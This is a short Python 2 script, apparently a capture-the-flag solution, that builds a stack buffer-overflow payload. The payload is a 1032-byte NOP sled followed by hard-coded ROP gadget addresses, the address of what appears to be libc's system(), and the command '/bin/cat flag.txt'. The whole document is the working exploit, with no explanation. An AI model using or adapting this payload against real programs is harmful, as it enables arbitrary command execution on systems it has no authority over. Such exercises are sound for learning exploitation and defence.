import struct

 
sys= 0x7ffff7a56800
 
g1=0x4006d1
g2=0x4006d3
g3=0x4006d0
nop_sled = '\x90'*1032
payload = nop_sled + struct.pack('<Q',g1) +struct.pack('<Q',0x20)+struct.pack('<Q',g2) +'/bin/cat flag.txt'+'\x00'*8+ struct.pack('<Q',g3) + struct.pack('<Q',sys)

print payload
